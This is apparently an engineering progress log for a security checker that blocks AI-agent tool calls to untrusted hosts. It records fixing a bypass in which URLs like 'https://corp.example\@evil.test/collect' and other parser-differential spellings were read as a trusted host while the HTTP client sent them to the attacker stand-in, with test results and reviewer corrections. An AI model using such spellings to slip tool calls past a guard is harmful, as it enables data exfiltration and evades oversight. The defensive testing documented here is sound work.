# A2 — value-origin seam wiring: PROGRESS

Evidence goes here as the build runs, and failures are reported as failures.
Plan: `ARCHITECTURE.md`; brief: `BRIEF.md`; rulings: `docs/value-origin-rulings.md`.

How every run below was made, unless a line says otherwise:

- **macOS** (Darwin 25.6), CPython 3.12.2, in a scratch venv carrying pytest,
  httpx 0.28.1, urllib3 2.8.0, ada-url 4.0.0 and hatchling. The run uses
  `PYTHONPATH=<worktree>`, and `xaidr.__file__` was confirmed to be the worktree
  (memory: xaidr-worktree-venv-shadowing). The shared `.venv` was not used for
  these runs.
- **Linux:** `python:3.10-slim` (CPython 3.10.21) and `python:3.12-slim`
  (3.12.14). Each container copies the tree and runs `pip install '.[dev]'`.
- **Affected tests only.** The full suite was never run.

---

## M0 — finding 1, the backslash-userinfo authorization bypass (Q1). **Green. STOP AND REPORT.**

**STOP 2 / the owner's M0 STOP:** ENFORCE (M8) does not start until the owner
has seen this. The build continues with C-11 (M1), which does not depend on it.

**Commits.**
- Plan: `2f93115` (ARCHITECTURE.md).
- **M0 core change: `77ee2f8eea0c82804b403d180bc754e14af4b30d`, the new pin
  for paid**, in its own commit, as instructed. It is SEMANTIC:
  `expected.jsonl` moved, so paid's re-vendor bumps `EVALUATOR_GENERATION`
  (P4). It is not on `main`, so `vendor_value_origin.py`'s ancestry check
  refuses it until it is merged. Merging is the owner's call.
- Evidence: the commit after this one.

**The defect.** With `evil.test` recorded untrusted,
`http_post(url="https://corp.example\@evil.test/collect")` came back
**`principal`, AUTHORIZED, not blocked under ENFORCE**. The core read only the
WHATWG split (backslash is a slash: `corp.example`); httpx sends the request
to `evil.test`, and `urllib.parse` reads `evil.test` as its host. (Corrected at
review: an earlier draft said "httpx and urllib send". `urllib.request` passes
the raw netloc on and reaches neither host.) This is the 1.15.0 userinfo bypass shape in new code.

**The fix (Q1, amends V-23).** Every reading of the authority split that a real
consumer performs is a finding, and the weakest decides. That is R1's shape.
In `xaidr/value_origin/_authority.py`:

- **WHATWG reading:** via `urlsplit`, as before.
- **RFC 3986 reading:** urllib.parse and httpx, computed on the value as
  written.
- **Refused WHATWG string:** where `urlsplit` refuses it, the value stays
  `parse_failure` (decision 7), and the WHATWG host the split still finds is
  added beside it.

The RFC and refusal readings use a written-out split, because `urlsplit`
differs across CPython patch releases (V-4).

### Failing test first — the red, before any core change

The conformance rows (`supplementary.jsonl`, through `convert.py`, so
`expected.jsonl` and SOURCE.json were regenerated, not hand-edited), the
ENFORCE pins, the result-side test, and the multi-oracle differential, all run
against the unfixed core:

```
FAILED tests/value_origin_conformance/test_core.py::test_supplementary_case[V23-backslash]
FAILED tests/value_origin_conformance/test_core.py::test_supplementary_case[Q1-backslash-userinfo-bypass]
FAILED tests/value_origin_conformance/test_core.py::test_supplementary_case[Q1-backslash-userinfo-mirror]
FAILED tests/value_origin_conformance/test_core.py::test_supplementary_case[Q1-backslash-nonspecial-scheme]
FAILED tests/value_origin_conformance/test_core.py::test_q1_a_url_blocks_on_the_host_the_transport_reaches[Q1-backslash-nonspecial-scheme]
FAILED tests/value_origin_conformance/test_core.py::test_q1_a_url_blocks_on_the_host_the_transport_reaches[Q1-backslash-userinfo-bypass]
FAILED tests/value_origin_conformance/test_core.py::test_q1_a_poisoned_result_records_every_reading_of_its_url
FAILED tests/value_origin_conformance/test_authority.py::test_q1_every_reading_of_the_authority_split_is_a_finding[value_33chars-keys0]
FAILED tests/value_origin_conformance/test_authority.py::test_q1_every_reading_of_the_authority_split_is_a_finding[value_33chars-keys1]
FAILED tests/value_origin_conformance/test_authority.py::test_q1_every_reading_of_the_authority_split_is_a_finding[value_37chars-keys2]
FAILED tests/value_origin_conformance/test_authority.py::test_q1_authority_of_answers_none_for_a_value_with_two_authorities
11 failed, 9 passed, 137 deselected in 0.07s

E  AssertionError: Q1-backslash-userinfo-bypass: should_block under ENFORCE is False (wire principal), Q1 says True —
   a call httpx/urllib send to an UNTRUSTED host walked through because the core read only the other side of the backslash
E  AssertionError: 3703 readings name a host the core never reads ({'urllib.parse': 1705, 'httpx': 1674, 'ada-url (WHATWG)': 324}):
   a call the transport sends there is invisible to value origin, and under ENFORCE an untrusted host walks through.
   First five: 'http://corp.example\\@evil.test' urllib.parse reads dns:evil.test, core reads ['dns:corp.example']; ...
FAILED tests/test_differential_oracles.py::test_core_reads_every_host_any_consumer_reads
```

### Two more defects found while proving it, each red first

1. **V-4: `urlsplit` is not the same function on every interpreter.** The first
   fix computed the RFC reading with `urlsplit`. In the Linux containers that
   gave 336 under-reads (httpx 288, ada 48), for example
   `http://[::1]\@evil.test`. Its bracketed-host validation, a security
   backport, raises there on 3.10.21 and 3.12.14 and returns `evil.test` on
   3.12.2, while httpx sends it to `evil.test` everywhere. Fixed with a
   written-out split. The pin, red with the `urlsplit` version on Linux:
   ```
   == previous RFC split, py3.10
   FAILED ...test_q1_every_reading_of_the_authority_split_is_a_finding[http://[::1]\\@evil.test/x-keys6]
   FAILED tests/test_differential_oracles.py::test_core_reads_every_host_any_consumer_reads
   == previous RFC split, py3.12   (same two)
   ```
2. **A sibling of finding 1, found by the adversarial corpus.**
   `http://&a:foo(b]c@d:2/` from WPT goes to `d` through httpx, urllib3 and
   WHATWG. `urlsplit` refuses it, so the core read nothing (`parse_failure`
   alone never blocks). Spellings of that shape were added to the grid first:
   ```
   E  AssertionError: 6993 readings name a host the core never reads ({'httpx': 864, 'urllib3': 945, 'ada-url (WHATWG)': 5184})
   ```
   The new pins were red against the previous fix:
   ```
   FAILED ...test_supplementary_case[Q1-urlsplit-refusal]
   FAILED ...test_q1_a_url_blocks_on_the_host_the_transport_reaches[Q1-urlsplit-refusal]
   FAILED ...test_q1_every_reading_of_the_authority_split_is_a_finding[http://&a:foo(b]c@d:2/-keys7]
   FAILED tests/test_differential_oracles.py::test_core_reads_every_host_any_consumer_reads
   4 failed, 232 passed, 7 xfailed
   ```
3. **Over-reads.** These were caught by the over-read gate after the
   silent-failure review asked for `[` mid-host spellings:
   - 3,150 over-reads from reading past a mid-host `[` (`http:ev[il].test` read
     as `il`);
   - then 42 under-reads on 3.12.2, where `urlsplit` does read `il` from
     `http://[::1]\@ev[il].test`;
   - then 1,575 over-reads of bracketed non-IPv6 hosts (`http:[evil.test]`).

   **Then the milestone review.** The over-read class's stated reason was
   false ("an older `urllib.request` sends there"), and on macOS the class was
   absorbing 1,092 over-reads that even 3.12.2 refuses. Resolved by making the
   RFC reading reproduce **exactly** CPython 3.12.2's `urlsplit` checks and host
   rule, the most permissive version measured. The WHATWG fallback uses
   WHATWG's rule: a `[` must open the host and enclose IPv6. The class is now
   pinned both ways:
   - it absorbs **0** on 3.12.2, because urllib.parse there reads every host the
     core reads;
   - it absorbs **115** on 3.10.21 and 3.12.14, which refuse them.

### Green — the final code, three interpreters

The affected suites are `tests/value_origin_conformance/`,
`tests/test_differential_oracles.py`, `tests/test_differential_parsers.py`,
`tests/test_url_classes.py` and `tests/outside/`:

```
== macOS 3.12.2
499 passed, 12 xfailed in 21.01s
== linux 3.10
499 passed, 12 xfailed in 15.02s
== linux 3.12
499 passed, 12 xfailed in 10.93s
```

Counts on the committed differential corpus
(`scratchpad/count_grid.py`):

```
pre-fix core (base 25dc9de), macOS:  spellings=47124 under_reads=10780 {'urllib.parse': 1789, 'httpx': 2538, 'urllib3': 945, 'ada-url (WHATWG)': 5508}
M0 core, macOS py3.12.2:             spellings=47124 under_reads=0  over_reads_absorbed_by_named_class=0    unnamed_over_reads=0
M0 core, linux py3.10.21:            spellings=47124 under_reads=0  over_reads_absorbed_by_named_class=115  unnamed_over_reads=0
M0 core, linux py3.12.14:            spellings=47124 under_reads=0  over_reads_absorbed_by_named_class=115  unnamed_over_reads=0
```

The 12 xfails are strict. There are 11 pre-existing ones, plus
`test_residual_empty_hex_part_is_the_zero_address`, found below. On Linux the
`dev` extra installs on both 3.10 and 3.12, so nothing skips.

### Sabotage proof, on the final code, both directions

Run on the commit candidate. Every Q1 reading is removed (`others = []` in
`url_authority`):

```
=== SABOTAGE on final M0 code: every Q1 reading removed — new gates
E  AssertionError: 10780 readings name a host the core never reads ({'urllib.parse': 1789, 'httpx': 2538, 'urllib3': 945, 'ada-url (WHATWG)': 5508}): ...
FAILED tests/test_differential_oracles.py::test_core_reads_every_host_any_consumer_reads
FAILED ...test_supplementary_case[V23-backslash]
FAILED ...test_supplementary_case[Q1-backslash-userinfo-bypass]
FAILED ...test_supplementary_case[Q1-backslash-userinfo-mirror]
FAILED ...test_supplementary_case[Q1-backslash-nonspecial-scheme]
FAILED ...test_supplementary_case[Q1-urlsplit-refusal]
FAILED ...test_q1_a_url_blocks_on_the_host_the_transport_reaches[Q1-backslash-nonspecial-scheme]
FAILED ...test_q1_a_url_blocks_on_the_host_the_transport_reaches[Q1-backslash-userinfo-bypass]
FAILED ...test_q1_a_url_blocks_on_the_host_the_transport_reaches[Q1-urlsplit-refusal]
FAILED ...test_q1_a_poisoned_result_records_every_reading_of_its_url
FAILED ...test_q1_every_reading_of_the_authority_split_is_a_finding[value_33chars-keys0]
FAILED ...test_q1_every_reading_of_the_authority_split_is_a_finding[value_33chars-keys1]
FAILED ...test_q1_every_reading_of_the_authority_split_is_a_finding[value_37chars-keys2]
FAILED ...test_q1_every_reading_of_the_authority_split_is_a_finding[http://[::1]\\@evil.test/x-keys6]
FAILED ...test_q1_every_reading_of_the_authority_split_is_a_finding[http://&a:foo(b]c@d:2/-keys7]
FAILED ...test_q1_authority_of_answers_none_for_a_value_with_two_authorities
16 failed, 221 passed, 8 xfailed
=== same sabotage — the gates that existed before M0 (must stay green)
128 passed, 4 xfailed
=== RESTORED (byte-identical)
237 passed, 8 xfailed
```

**The discriminating half.** Under the same sabotage, the gates that existed
before M0 stay green, which is why they never saw finding 1:

- `test_v19_every_spelling_resolves_to_the_host_urllib_parse_finds`, with one
  oracle and an already-normalised URL fed to it;
- `tests/test_differential_parsers.py`;
- `tests/test_url_classes.py`.

### Outside the process: built wheel, fresh venv, `python -I`, base against HEAD

`tests/outside/harness.py` imports no `xaidr`. The driver refuses unless
`xaidr` comes from the venv's site-packages. httpx was installed in each venv
to show where the transport sends the same string.

```
=== base: wheel from git archive 25dc9de (A1 merge)
  xaidr from out-base/venv/lib/python3.12/site-packages/xaidr/__init__.py | py 3.12.2
  benign-one-authority   wire=principal          blocks_under_ENFORCE=False findings=['dns:corp.example']  httpx_sends_to=docs.corp.example
  bypass                 wire=principal          blocks_under_ENFORCE=False findings=['dns:corp.example']  httpx_sends_to=evil.test
  mirror                 wire=untrusted_source   blocks_under_ENFORCE=True  findings=['dns:evil.test']  httpx_sends_to=corp.example
  plain-untrusted        wire=untrusted_source   blocks_under_ENFORCE=True  findings=['dns:evil.test']  httpx_sends_to=evil.test
=== head: wheel from the M0 working tree
  xaidr from out-head/venv/lib/python3.12/site-packages/xaidr/__init__.py | py 3.12.2
  benign-one-authority   wire=principal          blocks_under_ENFORCE=False findings=['dns:corp.example']  httpx_sends_to=docs.corp.example
  bypass                 wire=untrusted_source   blocks_under_ENFORCE=True  findings=['dns:corp.example', 'dns:evil.test']  httpx_sends_to=evil.test
  mirror                 wire=untrusted_source   blocks_under_ENFORCE=True  findings=['dns:evil.test', 'dns:corp.example']  httpx_sends_to=corp.example
  plain-untrusted        wire=untrusted_source   blocks_under_ENFORCE=True  findings=['dns:evil.test']  httpx_sends_to=evil.test
```

`tests/outside/test_m0_reading_set_from_the_wheel.py` asserts the HEAD half in
CI's `full` config. The base half is one-off evidence: CI checks out with depth
1, so the base commit is not there to build.

**Scope of "end to end".** No sensor seam is wired yet, so the end-to-end path
in M0 is the core's public interface, which paid vendors, exercised from the
installed wheel. The same flow through `Sensor.scan_tool_call` becomes
observable at M4. It is deferred by construction, not skipped.

### Adversarial verification: a corpus the build never saw

The corpus is web-platform-tests `url/resources/urltestdata.json` at
`c48d58747e1f211527fb695fd60548a997fae617` (sha256 `81e85fd3…f652`,
BSD-3-Clause). It was fetched to the scratchpad and not vendored; vendoring
comes with M2 (Q19). It ran through the same four oracles, 696 absolute inputs.
Every remaining under-read falls in a named class, and **none is a split
defect**:

```
WPT under-reads after M0, by class (oracle readings):
    71  whitespace/control: known residual (strict xfail)   e.g. 'http://example\t.\norg'
    66  file:/data: ruled never a destination (decision 6)   e.g. 'file://example:1/'
    49  relative / scheme-less reference: not a sendable URL (V-19)   e.g. '//foo/bar'
     9  mailto:// authority: not a fetchable scheme   e.g. 'mailto://example.com:8080/pathname?search#hash'
     2  empty-hex IP part: new strict xfail (integer family)   e.g. 'https://0x.0x.0'
```

### Q3: refuse, never skip

The `base` install has no dev extra:

```
--- base install, oracle tests run directly (must REFUSE, not skip):
      6 errors
      3 REFUSING: hatchling (dev extra) is not installed, so no wheel can be built ...
      3 REFUSING: oracle(s) ['httpx', 'urllib3', 'ada-url'] are not installed, so this differential cannot compare ...
--- base install, as CI base runs them (explicit deselect):
364 passed, 1 skipped, 6 deselected, 8 xfailed
```

The one skip is the existing `test_built_wheel` (no hatchling in `base`). It
predates A2, and the new tests do not repeat its pattern.

### Found, not fixed (strict xfail, pasted red on adoption)

- **Empty hex part.** `https://0x.0x.0/` is 0.0.0.0 to WHATWG (ada) and to the
  macOS libc resolver that httpx and urllib3 hand the name to. glibc does not
  read it that way. The core reads `dns:0x.0`, because `int("0x", 16)` raises in
  `coerce_ip`. This is IP canonicalisation in the integer family, and it is
  fixed where `coerce_ip` is shared (M3). It is not a Q1 split question.

### Decisions this milestone made that need the owner's ruling

All are recorded in `docs/value-origin-rulings.md`, under "Decisions made in
the A2 build (M0)":

1. The RFC 3986 reading is a written-out split that reproduces CPython 3.12.2's
   `urlsplit`, not this interpreter's `urlsplit` (V-4, measured). The WHATWG
   fallback uses WHATWG's bracket rule.
2. A value `urlsplit` refuses stays `parse_failure` and carries the hosts the
   other readings find. That is Q1 applied to a refusal, found by WPT.
3. `authority_of` returns `None` for a value with two authorities, as for a
   two-mailbox list.
4. Over-read class `urlsplit-bracket-validation`: hosts 3.12.2's
   urllib.parse reads and later patch releases refuse. It absorbs 0 on 3.12.2
   and 115 on 3.10.21 / 3.12.14, and is pinned both ways.

### What changed outside `xaidr/value_origin/`

- `pyproject.toml`: the `dev` extra gains `httpx`, `urllib3` and `ada-url`.
  These are test oracles, not runtime dependencies (Q3).
- `.github/workflows/ci.yml`: `base` runs `-m "not requires_dev_extra"`;
  `full` runs everything.
- `tests/conftest.py`: registers the `requires_dev_extra` marker.
- `expected.jsonl` changed, which is **semantic** for paid (§4.5, P4):
  - +5 rows: `Q1-backslash-userinfo-bypass`, `-mirror`,
    `-nonspecial-scheme`, `-readings-agree`, `Q1-urlsplit-refusal`;
  - `V23-backslash`'s findings gained `dns:corp.example` (principal). Its wire
    is still `unresolved`.
  - Paid's re-vendor must bump `EVALUATOR_GENERATION`.

### Fresh-context reviews

- **silent-failure-hunter.** No swallowed exception or empty-default fallback
  in the diff. Everything it ran was confirmed: the merge, the refuse
  behaviour, the outside harness, and the regenerated data, which only adds
  findings. It flagged one corpus gap: a `[` mid-host was never generated. That
  is now in the grid, and it exposed the over-read and under-read pair above,
  now fixed. Its specific example `https://user@corp.ex[ample]:8080/x` is read
  as `ample` by the RFC reading, and every current `urlsplit` refuses it, so it
  falls in the named class.
- **milestone-reviewer.** Five of six claims held. It ran the HEAD and fixed
  cores side by side, the refusal, the outside driver's refusal and the
  `convert.py` byte-identity. It found:
  1. **False:** "httpx and urllib send it to evil.test". urllib.request
     passes the raw netloc; only urllib.parse reads evil.test. **Retracted in
     place** in `docs/value-origin-rulings.md` and the ARCHITECTURE.md F1 row
     and §2.3, and corrected in every test message, docstring and conformance
     rule text that said it. The grep comes back clean.
  2. **Not reproducible:** "3,703 under-reads across 31,752 spellings" came
     from the first grid. The committed corpus is 47,124 spellings, with 10,780
     under-reads pre-fix (pasted above). Retracted in place.
  3. **Wrong:** decision 4's "31 spellings, Linux only", and its reason. Fixed
     as above. The reviewer's own "macOS absorbs none" was also not what I
     measured: 1,092 then, 0 now.
  4. **Stale:** the rulings doc predated the bracket-rule change. Updated.

  The reviewer also noted the tree changed while it was reviewing. Every number
  in this file comes from the final commit candidate (`_authority.py`
  re-checked after the last edit).
